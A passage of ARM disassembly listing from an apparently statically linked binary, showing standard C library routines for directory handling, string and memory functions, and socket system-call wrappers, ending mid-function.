0001641c <__GI_closedir>:
   1641c:	e92d41f0 	push	{r4, r5, r6, r7, r8, lr}
   16420:	e5903000 	ldr	r3, [r0]
   16424:	e59f60e4 	ldr	r6, [pc, #228]	; 16510 <__GI_closedir+0xf4>
   16428:	e3730001 	cmn	r3, #1
   1642c:	e24dd010 	sub	sp, sp, #16
   16430:	e1a07000 	mov	r7, r0
   16434:	e08f6006 	add	r6, pc, r6
   16438:	1a000006 	bne	16458 <__GI_closedir+0x3c>
   1643c:	e59f20d0 	ldr	r2, [pc, #208]	; 16514 <__GI_closedir+0xf8>
   16440:	eb00110a 	bl	1a870 <__aeabi_read_tp>
   16444:	e79f2002 	ldr	r2, [pc, r2]
   16448:	e1a01003 	mov	r1, r3
   1644c:	e283300a 	add	r3, r3, #10
   16450:	e7803002 	str	r3, [r0, r2]
   16454:	ea000029 	b	16500 <__GI_closedir+0xe4>
   16458:	e59f30b8 	ldr	r3, [pc, #184]	; 16518 <__GI_closedir+0xfc>
   1645c:	e2804018 	add	r4, r0, #24
   16460:	e1a02004 	mov	r2, r4
   16464:	e7961003 	ldr	r1, [r6, r3]
   16468:	e1a0000d 	mov	r0, sp
   1646c:	e59f30a8 	ldr	r3, [pc, #168]	; 1651c <__GI_closedir+0x100>
   16470:	e796c003 	ldr	ip, [r6, r3]
   16474:	e1a0e00f 	mov	lr, pc
   16478:	e12fff1c 	bx	ip
   1647c:	e3e08000 	mvn	r8, #0
   16480:	e1a00004 	mov	r0, r4
   16484:	e59f3094 	ldr	r3, [pc, #148]	; 16520 <__GI_closedir+0x104>
   16488:	e796c003 	ldr	ip, [r6, r3]
   1648c:	e1a0e00f 	mov	lr, pc
   16490:	e12fff1c 	bx	ip
   16494:	e5974000 	ldr	r4, [r7]
   16498:	e3a01001 	mov	r1, #1
   1649c:	e59f3080 	ldr	r3, [pc, #128]	; 16524 <__GI_closedir+0x108>
   164a0:	e1a0000d 	mov	r0, sp
   164a4:	e5878000 	str	r8, [r7]
   164a8:	e796c003 	ldr	ip, [r6, r3]
   164ac:	e1a0e00f 	mov	lr, pc
   164b0:	e12fff1c 	bx	ip
   164b4:	e597000c 	ldr	r0, [r7, #12]
   164b8:	eb0007a0 	bl	18340 <free>
   164bc:	e1a00007 	mov	r0, r7
   164c0:	eb00079e 	bl	18340 <free>
   164c4:	e1a0500d 	mov	r5, sp
   164c8:	e1a00004 	mov	r0, r4
   164cc:	e3a07006 	mov	r7, #6
   164d0:	ef000000 	svc	0x00000000
   164d4:	e3700a01 	cmn	r0, #4096	; 0x1000
   164d8:	e1a02000 	mov	r2, r0
   164dc:	91a00000 	movls	r0, r0
   164e0:	9a000005 	bls	164fc <__GI_closedir+0xe0>
   164e4:	e59f303c 	ldr	r3, [pc, #60]	; 16528 <__GI_closedir+0x10c>
   164e8:	eb0010e0 	bl	1a870 <__aeabi_read_tp>
   164ec:	e79f3003 	ldr	r3, [pc, r3]
   164f0:	e2622000 	rsb	r2, r2, #0
   164f4:	e7802003 	str	r2, [r0, r3]
   164f8:	e1a00008 	mov	r0, r8
   164fc:	e1a01000 	mov	r1, r0
   16500:	e1a00001 	mov	r0, r1
   16504:	e28dd010 	add	sp, sp, #16
   16508:	e8bd41f0 	pop	{r4, r5, r6, r7, r8, lr}
   1650c:	e12fff1e 	bx	lr
   16510:	00012558 	.word	0x00012558
   16514:	000125a0 	.word	0x000125a0
   16518:	00000044 	.word	0x00000044
   1651c:	00000070 	.word	0x00000070
   16520:	00000010 	.word	0x00000010
   16524:	0000002c 	.word	0x0000002c
   16528:	000124f8 	.word	0x000124f8

0001652c <fd_to_DIR>:
   1652c:	e92d40f0 	push	{r4, r5, r6, r7, lr}
   16530:	e1a07000 	mov	r7, r0
   16534:	e24dd01c 	sub	sp, sp, #28
   16538:	e3a00030 	mov	r0, #48	; 0x30
   1653c:	e1a04001 	mov	r4, r1
   16540:	eb000357 	bl	172a4 <malloc>
   16544:	e59f60a8 	ldr	r6, [pc, #168]	; 165f4 <fd_to_DIR+0xc8>
   16548:	e3500000 	cmp	r0, #0
   1654c:	e08f6006 	add	r6, pc, r6
   16550:	01a05000 	moveq	r5, r0
   16554:	0a000022 	beq	165e4 <fd_to_DIR+0xb8>
   16558:	e3a03000 	mov	r3, #0
   1655c:	e3540c02 	cmp	r4, #512	; 0x200
   16560:	e5803004 	str	r3, [r0, #4]
   16564:	e5803010 	str	r3, [r0, #16]
   16568:	e5803008 	str	r3, [r0, #8]
   1656c:	32833c02 	addcc	r3, r3, #512	; 0x200
   16570:	e5804014 	str	r4, [r0, #20]
   16574:	35803014 	strcc	r3, [r0, #20]
   16578:	e1a05000 	mov	r5, r0
   1657c:	e5807000 	str	r7, [r0]
   16580:	e5951014 	ldr	r1, [r5, #20]
   16584:	e3a00001 	mov	r0, #1
   16588:	eb000593 	bl	17bdc <calloc>
   1658c:	e3500000 	cmp	r0, #0
   16590:	e1a04000 	mov	r4, r0
   16594:	e585000c 	str	r0, [r5, #12]
   16598:	1a000003 	bne	165ac <fd_to_DIR+0x80>
   1659c:	e1a00005 	mov	r0, r5
   165a0:	eb000766 	bl	18340 <free>
   165a4:	e1a05004 	mov	r5, r4
   165a8:	ea00000d 	b	165e4 <fd_to_DIR+0xb8>
   165ac:	e59f3044 	ldr	r3, [pc, #68]	; 165f8 <fd_to_DIR+0xcc>
   165b0:	e0863003 	add	r3, r6, r3
   165b4:	e1a0c003 	mov	ip, r3
   165b8:	e8bc000f 	ldm	ip!, {r0, r1, r2, r3}
   165bc:	e1a0e00d 	mov	lr, sp
   165c0:	e8ae000f 	stmia	lr!, {r0, r1, r2, r3}
   165c4:	e89c0003 	ldm	ip, {r0, r1}
   165c8:	e1a0c00d 	mov	ip, sp
   165cc:	e88e0003 	stm	lr, {r0, r1}
   165d0:	e8bc000f 	ldm	ip!, {r0, r1, r2, r3}
   165d4:	e285c018 	add	ip, r5, #24
   165d8:	e8ac000f 	stmia	ip!, {r0, r1, r2, r3}
   165dc:	e89e0003 	ldm	lr, {r0, r1}
   165e0:	e88c0003 	stm	ip, {r0, r1}
   165e4:	e1a00005 	mov	r0, r5
   165e8:	e28dd01c 	add	sp, sp, #28
   165ec:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   165f0:	e12fff1e 	bx	lr
   165f4:	00012440 	.word	0x00012440
   165f8:	ffff7ae8 	.word	0xffff7ae8

000165fc <__GI_opendir>:
   165fc:	e92d4080 	push	{r7, lr}
   16600:	e59f10ac 	ldr	r1, [pc, #172]	; 166b4 <__GI_opendir+0xb8>
   16604:	e24dd058 	sub	sp, sp, #88	; 0x58
   16608:	e3a07005 	mov	r7, #5
   1660c:	ef000000 	svc	0x00000000
   16610:	e3700a01 	cmn	r0, #4096	; 0x1000
   16614:	e1a02000 	mov	r2, r0
   16618:	9a000005 	bls	16634 <__GI_opendir+0x38>
   1661c:	e59f3094 	ldr	r3, [pc, #148]	; 166b8 <__GI_opendir+0xbc>
   16620:	eb001092 	bl	1a870 <__aeabi_read_tp>
   16624:	e79f3003 	ldr	r3, [pc, r3]
   16628:	e2622000 	rsb	r2, r2, #0
   1662c:	e7802003 	str	r2, [r0, r3]
   16630:	ea000008 	b	16658 <__GI_opendir+0x5c>
   16634:	e2507000 	subs	r7, r0, #0
   16638:	ba000006 	blt	16658 <__GI_opendir+0x5c>
   1663c:	e1a0100d 	mov	r1, sp
   16640:	eb0010b8 	bl	1a928 <__GI_fstat>
   16644:	e3500000 	cmp	r0, #0
   16648:	aa000004 	bge	16660 <__GI_opendir+0x64>
   1664c:	e1a00007 	mov	r0, r7
   16650:	e3a07006 	mov	r7, #6
   16654:	ef000000 	svc	0x00000000
   16658:	e3a01000 	mov	r1, #0
   1665c:	ea000010 	b	166a4 <__GI_opendir+0xa8>
   16660:	e3a01002 	mov	r1, #2
   16664:	e3a02001 	mov	r2, #1
   16668:	e1a00007 	mov	r0, r7
   1666c:	ebfffe2a 	bl	15f1c <__GI___fcntl_nocancel>
   16670:	e59d1030 	ldr	r1, [sp, #48]	; 0x30
   16674:	e1a00007 	mov	r0, r7
   16678:	ebffffab 	bl	1652c <fd_to_DIR>
   1667c:	e2501000 	subs	r1, r0, #0
   16680:	1a000007 	bne	166a4 <__GI_opendir+0xa8>
   16684:	e1a00007 	mov	r0, r7
   16688:	e3a07006 	mov	r7, #6
   1668c:	ef000000 	svc	0x00000000
   16690:	e59f3024 	ldr	r3, [pc, #36]	; 166bc <__GI_opendir+0xc0>
   16694:	eb001075 	bl	1a870 <__aeabi_read_tp>
   16698:	e79f3003 	ldr	r3, [pc, r3]
   1669c:	e3a0200c 	mov	r2, #12
   166a0:	e7802003 	str	r2, [r0, r3]
   166a4:	e1a00001 	mov	r0, r1
   166a8:	e28dd058 	add	sp, sp, #88	; 0x58
   166ac:	e8bd4080 	pop	{r7, lr}
   166b0:	e12fff1e 	bx	lr
   166b4:	00084800 	.word	0x00084800
   166b8:	000123c0 	.word	0x000123c0
   166bc:	0001234c 	.word	0x0001234c

000166c0 <fdopendir>:
   166c0:	e92d4030 	push	{r4, r5, lr}
   166c4:	e24dd05c 	sub	sp, sp, #92	; 0x5c
   166c8:	e1a0100d 	mov	r1, sp
   166cc:	e1a04000 	mov	r4, r0
   166d0:	eb001094 	bl	1a928 <__GI_fstat>
   166d4:	e2505000 	subs	r5, r0, #0
   166d8:	1a00001d 	bne	16754 <fdopendir+0x94>
   166dc:	e59d3010 	ldr	r3, [sp, #16]
   166e0:	e2033a0f 	and	r3, r3, #61440	; 0xf000
   166e4:	e3530901 	cmp	r3, #16384	; 0x4000
   166e8:	0a000005 	beq	16704 <fdopendir+0x44>
   166ec:	e59f2074 	ldr	r2, [pc, #116]	; 16768 <fdopendir+0xa8>
   166f0:	eb00105e 	bl	1a870 <__aeabi_read_tp>
   166f4:	e79f2002 	ldr	r2, [pc, r2]
   166f8:	e1a01005 	mov	r1, r5
   166fc:	e3a03014 	mov	r3, #20
   16700:	ea00000c 	b	16738 <fdopendir+0x78>
   16704:	e1a00004 	mov	r0, r4
   16708:	e3a01003 	mov	r1, #3
   1670c:	ebfffe28 	bl	15fb4 <__GI___libc_fcntl>
   16710:	e3700001 	cmn	r0, #1
   16714:	0a00000e 	beq	16754 <fdopendir+0x94>
   16718:	e2003003 	and	r3, r0, #3
   1671c:	e3530001 	cmp	r3, #1
   16720:	1a000006 	bne	16740 <fdopendir+0x80>
   16724:	e59f2040 	ldr	r2, [pc, #64]	; 1676c <fdopendir+0xac>
   16728:	eb001050 	bl	1a870 <__aeabi_read_tp>
   1672c:	e79f2002 	ldr	r2, [pc, r2]
   16730:	e1a01005 	mov	r1, r5
   16734:	e2833015 	add	r3, r3, #21
   16738:	e7803002 	str	r3, [r0, r2]
   1673c:	ea000005 	b	16758 <fdopendir+0x98>
   16740:	e59d1030 	ldr	r1, [sp, #48]	; 0x30
   16744:	e1a00004 	mov	r0, r4
   16748:	ebffff77 	bl	1652c <fd_to_DIR>
   1674c:	e1a01000 	mov	r1, r0
   16750:	ea000000 	b	16758 <fdopendir+0x98>
   16754:	e3a01000 	mov	r1, #0
   16758:	e1a00001 	mov	r0, r1
   1675c:	e28dd05c 	add	sp, sp, #92	; 0x5c
   16760:	e8bd4030 	pop	{r4, r5, lr}
   16764:	e12fff1e 	bx	lr
   16768:	000122f0 	.word	0x000122f0
   1676c:	000122b8 	.word	0x000122b8

00016770 <__GI_readdir>:
   16770:	e92d40f0 	push	{r4, r5, r6, r7, lr}
   16774:	e59f60c8 	ldr	r6, [pc, #200]	; 16844 <__GI_readdir+0xd4>
   16778:	e59f30c8 	ldr	r3, [pc, #200]	; 16848 <__GI_readdir+0xd8>
   1677c:	e08f6006 	add	r6, pc, r6
   16780:	e24dd014 	sub	sp, sp, #20
   16784:	e2804018 	add	r4, r0, #24
   16788:	e7961003 	ldr	r1, [r6, r3]
   1678c:	e1a02004 	mov	r2, r4
   16790:	e59f30b4 	ldr	r3, [pc, #180]	; 1684c <__GI_readdir+0xdc>
   16794:	e1a05000 	mov	r5, r0
   16798:	e1a0000d 	mov	r0, sp
   1679c:	e796c003 	ldr	ip, [r6, r3]
   167a0:	e1a0e00f 	mov	lr, pc
   167a4:	e12fff1c 	bx	ip
   167a8:	e1a00004 	mov	r0, r4
   167ac:	e59f309c 	ldr	r3, [pc, #156]	; 16850 <__GI_readdir+0xe0>
   167b0:	e796c003 	ldr	ip, [r6, r3]
   167b4:	e1a0e00f 	mov	lr, pc
   167b8:	e12fff1c 	bx	ip
   167bc:	e3a07000 	mov	r7, #0
   167c0:	e995000c 	ldmib	r5, {r2, r3}
   167c4:	e1530002 	cmp	r3, r2
   167c8:	8a000008 	bhi	167f0 <__GI_readdir+0x80>
   167cc:	e5950000 	ldr	r0, [r5]
   167d0:	e595100c 	ldr	r1, [r5, #12]
   167d4:	e5952014 	ldr	r2, [r5, #20]
   167d8:	eb00106b 	bl	1a98c <__getdents>
   167dc:	e3500000 	cmp	r0, #0
   167e0:	d3a04000 	movle	r4, #0
   167e4:	da00000c 	ble	1681c <__GI_readdir+0xac>
   167e8:	e5850008 	str	r0, [r5, #8]
   167ec:	e5857004 	str	r7, [r5, #4]
   167f0:	e5952004 	ldr	r2, [r5, #4]
   167f4:	e595100c 	ldr	r1, [r5, #12]
   167f8:	e0824001 	add	r4, r2, r1
   167fc:	e5943004 	ldr	r3, [r4, #4]
   16800:	e5853010 	str	r3, [r5, #16]
   16804:	e1d430b8 	ldrh	r3, [r4, #8]
   16808:	e7921001 	ldr	r1, [r2, r1]
   1680c:	e0833002 	add	r3, r3, r2
   16810:	e3510000 	cmp	r1, #0
   16814:	e5853004 	str	r3, [r5, #4]
   16818:	0affffe8 	beq	167c0 <__GI_readdir+0x50>
   1681c:	e1a0000d 	mov	r0, sp
   16820:	e3a01001 	mov	r1, #1
   16824:	e59f3028 	ldr	r3, [pc, #40]	; 16854 <__GI_readdir+0xe4>
   16828:	e796c003 	ldr	ip, [r6, r3]
   1682c:	e1a0e00f 	mov	lr, pc
   16830:	e12fff1c 	bx	ip
   16834:	e1a00004 	mov	r0, r4
   16838:	e28dd014 	add	sp, sp, #20
   1683c:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   16840:	e12fff1e 	bx	lr
   16844:	00012210 	.word	0x00012210
   16848:	00000044 	.word	0x00000044
   1684c:	00000070 	.word	0x00000070
   16850:	00000010 	.word	0x00000010
   16854:	0000002c 	.word	0x0000002c

00016858 <__GI___errno_location>:
   16858:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1685c:	e59f3010 	ldr	r3, [pc, #16]	; 16874 <__GI___errno_location+0x1c>
   16860:	eb001002 	bl	1a870 <__aeabi_read_tp>
   16864:	e79f3003 	ldr	r3, [pc, r3]
   16868:	e0800003 	add	r0, r0, r3
   1686c:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   16870:	e12fff1e 	bx	lr
   16874:	00012180 	.word	0x00012180

00016878 <clock>:
   16878:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1687c:	e24dd014 	sub	sp, sp, #20
   16880:	e1a0000d 	mov	r0, sp
   16884:	eb001113 	bl	1acd8 <__GI_times>
   16888:	e89d000c 	ldm	sp, {r2, r3}
   1688c:	e0833002 	add	r3, r3, r2
   16890:	e59f2010 	ldr	r2, [pc, #16]	; 168a8 <clock+0x30>
   16894:	e0000293 	mul	r0, r3, r2
   16898:	e3c0013e 	bic	r0, r0, #-2147483633	; 0x8000000f
   1689c:	e28dd014 	add	sp, sp, #20
   168a0:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   168a4:	e12fff1e 	bx	lr
   168a8:	00002710 	.word	0x00002710
   168ac:	00000000 	.word	0x00000000

000168b0 <__GI_memcpy>:
   168b0:	ea0017a2 	b	1c740 <_memcpy>
   168b4:	e1a00000 	nop			; (mov r0, r0)
   168b8:	e1a00000 	nop			; (mov r0, r0)
   168bc:	e1a00000 	nop			; (mov r0, r0)

000168c0 <__GI_memmove>:
   168c0:	ea00179e 	b	1c740 <_memcpy>
   168c4:	e1a00000 	nop			; (mov r0, r0)
   168c8:	e1a00000 	nop			; (mov r0, r0)
   168cc:	e1a00000 	nop			; (mov r0, r0)

000168d0 <__GI_memset>:
   168d0:	e1a03000 	mov	r3, r0
   168d4:	e3520008 	cmp	r2, #8
   168d8:	ba000016 	blt	16938 <__GI_memset+0x68>
   168dc:	e1811401 	orr	r1, r1, r1, lsl #8
   168e0:	e1811801 	orr	r1, r1, r1, lsl #16
   168e4:	e3130003 	tst	r3, #3
   168e8:	14c31001 	strbne	r1, [r3], #1
   168ec:	12422001 	subne	r2, r2, #1
   168f0:	1afffffb 	bne	168e4 <__GI_memset+0x14>
   168f4:	e1a0c001 	mov	ip, r1
   168f8:	e3520008 	cmp	r2, #8
   168fc:	ba00000d 	blt	16938 <__GI_memset+0x68>
   16900:	e8a31002 	stmia	r3!, {r1, ip}
   16904:	e2422008 	sub	r2, r2, #8
   16908:	e3520008 	cmp	r2, #8
   1690c:	ba000009 	blt	16938 <__GI_memset+0x68>
   16910:	e8a31002 	stmia	r3!, {r1, ip}
   16914:	e2422008 	sub	r2, r2, #8
   16918:	e3520008 	cmp	r2, #8
   1691c:	ba000005 	blt	16938 <__GI_memset+0x68>
   16920:	e8a31002 	stmia	r3!, {r1, ip}
   16924:	e2422008 	sub	r2, r2, #8
   16928:	e3520008 	cmp	r2, #8
   1692c:	a8a31002 	stmiage	r3!, {r1, ip}
   16930:	a2422008 	subge	r2, r2, #8
   16934:	aaffffef 	bge	168f8 <__GI_memset+0x28>
   16938:	e1b02002 	movs	r2, r2
   1693c:	01a0f00e 	moveq	pc, lr
   16940:	e2622007 	rsb	r2, r2, #7
   16944:	e08ff102 	add	pc, pc, r2, lsl #2
   16948:	e1a00000 	nop			; (mov r0, r0)
   1694c:	e4c31001 	strb	r1, [r3], #1
   16950:	e4c31001 	strb	r1, [r3], #1
   16954:	e4c31001 	strb	r1, [r3], #1
   16958:	e4c31001 	strb	r1, [r3], #1
   1695c:	e4c31001 	strb	r1, [r3], #1
   16960:	e4c31001 	strb	r1, [r3], #1
   16964:	e4c31001 	strb	r1, [r3], #1
   16968:	e1a0f00e 	mov	pc, lr
   1696c:	e1a00000 	nop			; (mov r0, r0)

00016970 <__GI_strlen>:
   16970:	e3c01003 	bic	r1, r0, #3
   16974:	e4912004 	ldr	r2, [r1], #4
   16978:	e2103003 	ands	r3, r0, #3
   1697c:	e2630000 	rsb	r0, r3, #0
   16980:	0a000004 	beq	16998 <Laligned>
   16984:	e38220ff 	orr	r2, r2, #255	; 0xff
   16988:	e2533001 	subs	r3, r3, #1
   1698c:	c3822cff 	orrgt	r2, r2, #65280	; 0xff00
   16990:	e2533001 	subs	r3, r3, #1
   16994:	c38228ff 	orrgt	r2, r2, #16711680	; 0xff0000

00016998 <Laligned>:
   16998:	e31200ff 	tst	r2, #255	; 0xff
   1699c:	13120cff 	tstne	r2, #65280	; 0xff00
   169a0:	131208ff 	tstne	r2, #16711680	; 0xff0000
   169a4:	131204ff 	tstne	r2, #-16777216	; 0xff000000
   169a8:	12800004 	addne	r0, r0, #4
   169ac:	14912004 	ldrne	r2, [r1], #4
   169b0:	1afffff8 	bne	16998 <Laligned>

000169b4 <Llastword>:
   169b4:	e31200ff 	tst	r2, #255	; 0xff
   169b8:	12800001 	addne	r0, r0, #1
   169bc:	13120cff 	tstne	r2, #65280	; 0xff00
   169c0:	12800001 	addne	r0, r0, #1
   169c4:	131208ff 	tstne	r2, #16711680	; 0xff0000
   169c8:	12800001 	addne	r0, r0, #1
   169cc:	e1a0f00e 	mov	pc, lr

000169d0 <__GI_strcpy>:
   169d0:	e1a02000 	mov	r2, r0
   169d4:	ea000001 	b	169e0 <__GI_strcpy+0x10>
   169d8:	e2811001 	add	r1, r1, #1
   169dc:	e2822001 	add	r2, r2, #1
   169e0:	e5d13000 	ldrb	r3, [r1]
   169e4:	e3530000 	cmp	r3, #0
   169e8:	e5c23000 	strb	r3, [r2]
   169ec:	1afffff9 	bne	169d8 <__GI_strcpy+0x8>
   169f0:	e12fff1e 	bx	lr

000169f4 <__GI_strdup>:
   169f4:	e92d4070 	push	{r4, r5, r6, lr}
   169f8:	e1a06000 	mov	r6, r0
   169fc:	ebffffdb 	bl	16970 <__GI_strlen>
   16a00:	e2804001 	add	r4, r0, #1
   16a04:	e1a00004 	mov	r0, r4
   16a08:	eb000225 	bl	172a4 <malloc>
   16a0c:	e2505000 	subs	r5, r0, #0
   16a10:	11a01006 	movne	r1, r6
   16a14:	11a02004 	movne	r2, r4
   16a18:	1bffffa4 	blne	168b0 <__GI_memcpy>
   16a1c:	e1a00005 	mov	r0, r5
   16a20:	e8bd4070 	pop	{r4, r5, r6, lr}
   16a24:	e12fff1e 	bx	lr

00016a28 <__GI_strtok>:
   16a28:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   16a2c:	e59f301c 	ldr	r3, [pc, #28]	; 16a50 <__GI_strtok+0x28>
   16a30:	e59f201c 	ldr	r2, [pc, #28]	; 16a54 <__GI_strtok+0x2c>
   16a34:	e08f3003 	add	r3, pc, r3
   16a38:	e24dd004 	sub	sp, sp, #4
   16a3c:	e0832002 	add	r2, r3, r2
   16a40:	eb001919 	bl	1ceac <__GI_strtok_r>
   16a44:	e28dd004 	add	sp, sp, #4
   16a48:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   16a4c:	e12fff1e 	bx	lr
   16a50:	00011f58 	.word	0x00011f58
   16a54:	00000450 	.word	0x00000450

00016a58 <__GI_inet_addr>:
   16a58:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   16a5c:	e24dd00c 	sub	sp, sp, #12
   16a60:	e28d1004 	add	r1, sp, #4
   16a64:	eb001966 	bl	1d004 <__GI_inet_aton>
   16a68:	e3500000 	cmp	r0, #0
   16a6c:	159d0004 	ldrne	r0, [sp, #4]
   16a70:	03e00000 	mvneq	r0, #0
   16a74:	e28dd00c 	add	sp, sp, #12
   16a78:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   16a7c:	e12fff1e 	bx	lr

00016a80 <__sys_accept>:
   16a80:	e92d4080 	push	{r7, lr}
   16a84:	e59f7030 	ldr	r7, [pc, #48]	; 16abc <__sys_accept+0x3c>
   16a88:	ef000000 	svc	0x00000000
   16a8c:	e3700a01 	cmn	r0, #4096	; 0x1000
   16a90:	e1a02000 	mov	r2, r0
   16a94:	91a00000 	movls	r0, r0
   16a98:	9a000005 	bls	16ab4 <__sys_accept+0x34>
   16a9c:	e59f301c 	ldr	r3, [pc, #28]	; 16ac0 <__sys_accept+0x40>
   16aa0:	eb000f72 	bl	1a870 <__aeabi_read_tp>
   16aa4:	e79f3003 	ldr	r3, [pc, r3]
   16aa8:	e2622000 	rsb	r2, r2, #0
   16aac:	e7802003 	str	r2, [r0, r3]
   16ab0:	e3e00000 	mvn	r0, #0
   16ab4:	e8bd4080 	pop	{r7, lr}
   16ab8:	e12fff1e 	bx	lr
   16abc:	0000011d 	.word	0x0000011d
   16ac0:	00011f40 	.word	0x00011f40

00016ac4 <__libc_accept>:
   16ac4:	e59f3064 	ldr	r3, [pc, #100]	; 16b30 <__libc_accept+0x6c>
   16ac8:	e92d40f0 	push	{r4, r5, r6, r7, lr}
   16acc:	e59fc060 	ldr	ip, [pc, #96]	; 16b34 <__libc_accept+0x70>
   16ad0:	e08f3003 	add	r3, pc, r3
   16ad4:	e793c00c 	ldr	ip, [r3, ip]
   16ad8:	e35c0000 	cmp	ip, #0
   16adc:	e24dd004 	sub	sp, sp, #4
   16ae0:	e1a04000 	mov	r4, r0
   16ae4:	e1a06001 	mov	r6, r1
   16ae8:	e1a07002 	mov	r7, r2
   16aec:	1a000002 	bne	16afc <__libc_accept+0x38>
   16af0:	e28dd004 	add	sp, sp, #4
   16af4:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   16af8:	eaffffe0 	b	16a80 <__sys_accept>
   16afc:	eb000d79 	bl	1a0e8 <__libc_enable_asynccancel>
   16b00:	e1a01006 	mov	r1, r6
   16b04:	e1a05000 	mov	r5, r0
   16b08:	e1a02007 	mov	r2, r7
   16b0c:	e1a00004 	mov	r0, r4
   16b10:	ebffffda 	bl	16a80 <__sys_accept>
   16b14:	e1a04000 	mov	r4, r0
   16b18:	e1a00005 	mov	r0, r5
   16b1c:	eb000d4f 	bl	1a060 <__libc_disable_asynccancel>
   16b20:	e1a00004 	mov	r0, r4
   16b24:	e28dd004 	add	sp, sp, #4
   16b28:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   16b2c:	e12fff1e 	bx	lr
   16b30:	00011ebc 	.word	0x00011ebc
   16b34:	0000356c 	.word	0x0000356c

00016b38 <__GI_bind>:
   16b38:	e92d4080 	push	{r7, lr}
   16b3c:	e59f7030 	ldr	r7, [pc, #48]	; 16b74 <__GI_bind+0x3c>
   16b40:	ef000000 	svc	0x00000000
   16b44:	e3700a01 	cmn	r0, #4096	; 0x1000
   16b48:	e1a02000 	mov	r2, r0
   16b4c:	91a00000 	movls	r0, r0
   16b50:	9a000005 	bls	16b6c <__GI_bind+0x34>
   16b54:	e59f301c 	ldr	r3, [pc, #28]	; 16b78 <__GI_bind+0x40>
   16b58:	eb000f44 	bl	1a870 <__aeabi_read_tp>
   16b5c:	e79f3003 	ldr	r3, [pc, r3]
   16b60:	e2622000 	rsb	r2, r2, #0
   16b64:	e7802003 	str	r2, [r0, r3]
   16b68:	e3e00000 	mvn	r0, #0
   16b6c:	e8bd4080 	pop	{r7, lr}
   16b70:	e12fff1e 	bx	lr
   16b74:	0000011a 	.word	0x0000011a
   16b78:	00011e88 	.word	0x00011e88

00016b7c <__sys_connect>:
   16b7c:	e92d4080 	push	{r7, lr}
   16b80:	e59f7030 	ldr	r7, [pc, #48]	; 16bb8 <__sys_connect+0x3c>
   16b84:	ef000000 	svc	0x00000000
   16b88:	e3700a01 	cmn	r0, #4096	; 0x1000
   16b8c:	e1a02000 	mov	r2, r0
   16b90:	91a00000 	movls	r0, r0
   16b94:	9a000005 	bls	16bb0 <__sys_connect+0x34>
   16b98:	e59f301c 	ldr	r3, [pc, #28]	; 16bbc <__sys_connect+0x40>
   16b9c:	eb000f33 	bl	1a870 <__aeabi_read_tp>
   16ba0:	e79f3003 	ldr	r3, [pc, r3]
   16ba4:	e2622000 	rsb	r2, r2, #0
   16ba8:	e7802003 	str	r2, [r0, r3]
   16bac:	e3e00000 	mvn	r0, #0
   16bb0:	e8bd4080 	pop	{r7, lr}
   16bb4:	e12fff1e 	bx	lr
   16bb8:	0000011b 	.word	0x0000011b
   16bbc:	00011e44 	.word	0x00011e44

00016bc0 <__libc_connect>:
   16bc0:	e59f3064 	ldr	r3, [pc, #100]	; 16c2c <__libc_connect+0x6c>
   16bc4:	e92d40f0 	push	{r4, r5, r6, r7, lr}
   16bc8:	e59fc060 	ldr	ip, [pc, #96]	; 16c30 <__libc_connect+0x70>
   16bcc:	e08f3003 	add	r3, pc, r3
   16bd0:	e793c00c 	ldr	ip, [r3, ip]
   16bd4:	e35c0000 	cmp	ip, #0
   16bd8:	e24dd004 	sub	sp, sp, #4
   16bdc:	e1a04000 	mov	r4, r0
   16be0:	e1a06001 	mov	r6, r1
   16be4:	e1a07002 	mov	r7, r2
   16be8:	1a000002 	bne	16bf8 <__libc_connect+0x38>
   16bec:	e28dd004 	add	sp, sp, #4
   16bf0:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   16bf4:	eaffffe0 	b	16b7c <__sys_connect>
   16bf8:	eb000d3a 	bl	1a0e8 <__libc_enable_asynccancel>
   16bfc:	e1a01006 	mov	r1, r6
   16c00:	e1a05000 	mov	r5, r0
   16c04:	e1a02007 	mov	r2, r7
   16c08:	e1a00004 	mov	r0, r4
   16c0c:	ebffffda 	bl	16b7c <__sys_connect>
   16c10:	e1a04000 	mov	r4, r0
   16c14:	e1a00005 	mov	r0, r5
   16c18:	eb000d10 	bl	1a060 <__libc_disable_asynccancel>
   16c1c:	e1a00004 	mov	r0, r4
   16c20:	e28dd004 	add	sp, sp, #4
   16c24:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   16c28:	e12fff1e 	bx	lr
   16c2c:	00011dc0 	.word	0x00011dc0
   16c30:	0000356c 	.word	0x0000356c

00016c34 <__GI_getsockname>:
   16c34:	e92d4080 	push	{r7, lr}
   16c38:	e59f7030 	ldr	r7, [pc, #48]	; 16c70 <__GI_getsockname+0x3c>
   16c3c:	ef000000 	svc	0x00000000
   16c40:	e3700a01 	cmn	r0, #4096	; 0x1000
   16c44:	e1a02000 	mov	r2, r0
   16c48:	91a00000 	movls	r0, r0
   16c4c:	9a000005 	bls	16c68 <__GI_getsockname+0x34>
   16c50:	e59f301c 	ldr	r3, [pc, #28]	; 16c74 <__GI_getsockname+0x40>
   16c54:	eb000f05 	bl	1a870 <__aeabi_read_tp>
   16c58:	e79f3003 	ldr	r3, [pc, r3]
   16c5c:	e2622000 	rsb	r2, r2, #0
   16c60:	e7802003 	str	r2, [r0, r3]
   16c64:	e3e00000 	mvn	r0, #0
   16c68:	e8bd4080 	pop	{r7, lr}
   16c6c:	e12fff1e 	bx	lr
   16c70:	0000011e 	.word	0x0000011e
   16c74:	00011d8c 	.word	0x00011d8c

00016c78 <getsockopt>:
   16c78:	e92d4090 	push	{r4, r7, lr}
   16c7c:	e59d400c 	ldr	r4, [sp, #12]
   16c80:	e59f7030 	ldr	r7, [pc, #48]	; 16cb8 <getsockopt+0x40>
   16c84:	ef000000 	svc	0x00000000
   16c88:	e3700a01 	cmn	r0, #4096	; 0x1000
   16c8c:	e1a02000 	mov	r2, r0
   16c90:	91a00000 	movls	r0, r0
